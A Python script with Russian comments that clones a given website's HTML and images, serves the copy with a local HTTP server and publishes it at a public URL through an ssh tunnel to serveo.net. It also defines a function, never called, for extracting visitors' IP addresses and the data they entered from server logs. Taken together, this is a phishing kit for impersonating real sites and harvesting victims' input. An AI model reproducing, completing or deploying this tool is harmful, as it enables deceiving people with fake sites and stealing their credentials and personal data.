import requests
import subprocess
import time
import os
import re  # Импортируем модуль для работы с регулярными выражениями
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

# Введите URL
url = input('\nВведите URL ➤ ')

# Проверяем, что URL не пустой
if url.strip():
    # Скачиваем страницу по ссылке
    response = requests.get(url)
    html_content = response.text

    # Преобразуем относительные ссылки в абсолютные
    soup = BeautifulSoup(html_content, 'html.parser')
    base_url = response.url

    def make_absolute_links(tag, attribute):
        if not tag[attribute].startswith(('http://', 'https://', '//')):
            tag[attribute] = urljoin(base_url, tag[attribute])

    # Преобразуем относительные ссылки
    for tag in soup.find_all(['a', 'link'], href=True):
        make_absolute_links(tag, 'href')

    for tag in soup.find_all(['img', 'script'], src=True):
        make_absolute_links(tag, 'src')

    for tag in soup.find_all('img', {'data-src': True}):
        make_absolute_links(tag, 'data-src')

    # Ждем некоторое время перед сохранением HTML-кода
    time.sleep(5)

    # Добавляем JavaScript-скрипт для обработки асинхронной загрузки изображений
    script = """
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var lazyImages = document.querySelectorAll('img[data-src]');
            lazyImages.forEach(function(img) {
                img.setAttribute('src', img.getAttribute('data-src'));
            });
        });
    </script>
    """

    # Вставляем скрипт в конец HTML-страницы
    soup.body.append(BeautifulSoup(script, 'html.parser'))

    # Проверяем наличие изображений на странице и сохраняем их
    image_folder = 'images'
    os.makedirs(image_folder, exist_ok=True)

    image_paths = []
    image_tags = soup.find_all('img')
    for img_tag in image_tags:
        if 'src' in img_tag.attrs:  # Проверяем наличие атрибута 'src'
            make_absolute_links(img_tag, 'src')
            image_url = img_tag['src']
            image_name = os.path.basename(urlparse(image_url).path)
            image_path = os.path.join(image_folder, image_name)

            try:
                image_content = requests.get(image_url).content
                with open(image_path, 'wb') as image_file:
                    image_file.write(image_content)
                print(f"Изображение сохранено: {image_path}")
                image_paths.append(image_path)
            except Exception as e:
                print(f"Ошибка при сохранении изображения {image_url}: {str(e)}")
        else:
            print("Тег изображения не содержит атрибута 'src'.")

    # Сохраняем HTML-код в файл
    file_path = 'downloaded_page.html'
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(str(soup.prettify()))  # Используем prettify для более красивого форматирования

    print(f"Страница успешно скачана и сохранена в файл {file_path}")

# Функция для извлечения IP-адреса и данных, введённых на сайте, из логов
def parse_logs(log_file):
    ip_regex = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'  # Регулярное выражение для поиска IP-адреса
    data_regex = r'"([^"]*)"'  # Регулярное выражение для поиска введённых данных в кавычках
    results = []  # Список для хранения результатов

    with open(log_file, 'r') as f:
        for line in f:
            ip_match = re.search(ip_regex, line)
            data_match = re.search(data_regex, line)
            if ip_match and data_match:
                ip = ip_match.group()
                data = data_match.group(1)
                results.append((ip, data))
    return results

# Шаг 2: Запуск локального сервера

# Выполняем команду для запуска локального сервера на порту 8000 (или другом свободном порту)
local_server_command = 'python -m http.server 8000'

# Запускаем команду для локального сервера с помощью subprocess
local_server_process = subprocess.Popen(local_server_command, shell=True, stdout=subprocess.PIPE)

# Печатаем сообщение о запуске локального сервера
print("Локальный сервер запущен на порту 8000")

# Шаг 3: Запуск Serveo.net

# Используем оригинальную команду Serveo.net без изменений
tru_201 = '8000'  # Замените на нужный вам порт
serveo_command = f"ssh -q -R 80:localhost:{tru_201} serveo.net -T"
serveo_process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE)

# Получаем public URL из вывода процесса Serveo
serveo_url = serveo_process.stdout.readline().strip().decode('utf-8').split()[-1]

print(f"Файл доступен по следующему public URL: {serveo_url}")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    # Прерываем выполнение при нажатии Ctrl+C

    # Завершаем процессы локального сервера и Serveo.net
    local_server_process.terminate()
    serveo_process.terminate()

    # Удаляем все скачанные файлы
    os.remove(file_path)
    print("Скрипт завершен. Все скачанные файлы удалены.")
